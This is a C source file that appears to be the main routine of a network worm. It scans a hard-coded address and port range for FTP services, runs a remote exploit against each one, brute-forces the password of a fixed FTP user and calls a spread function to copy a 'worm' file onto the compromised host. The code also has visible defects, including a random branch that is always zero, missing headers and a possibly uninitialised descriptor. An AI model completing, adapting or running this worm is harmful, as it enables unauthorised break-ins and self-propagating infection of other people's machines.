#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//---
#include "scanner.h"
#include "bruteforce.h"
#include "exploit.h"
#include "spread.h"

#ifndef ADDRESS_RANGE
#  define ADDRESS_RANGE       "192.168.100.30"
#endif

#ifndef PORT_RANGE
#  define PORT_RANGE          "10-30"
#endif

#ifndef INTERFACE
#  define INTERFACE           "br0"
#endif

#ifndef USE_RAW_SOCKET
#  define USE_RAW_SOCKET      0
#endif

#ifndef FTP_USER
#  define FTP_USER            "rrlm"
#endif

int main(int argc, const char *argv[]) {
  struct scan_table *target_table, *target;
  char guess[MAX_PASSWORD_LENGTH];
  int ftp_fd, shell_fd, method;

  srand(time(NULL));
  target_table = scanner(ADDRESS_RANGE, PORT_RANGE, INTERFACE, USE_RAW_SOCKET, 0);

  if(target_table != NULL) {
    for(target = target_table; target != NULL; target = target->next) {
      if(strstr(target->banner, "FTP") != NULL) {
        shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");

        if((method = rand() % 1) == 0) {
          while(bruteforce(guess, sizeof guess) != 0) {
            if((ftp_fd = ftp_try_login(target->address, target->port, FTP_USER, guess)) > 0) {
              fprintf(stdout, "Connected to FTP! Password is \"%s\"\n", guess);
              break;
            }
          }
        } else {

        }

        if(ftp_fd != 0) {
          spread(ftp_fd, "worm", "worm");
          close(ftp_fd);
        }

        close(shell_fd);
      }
    }
  }

  return 0;
}
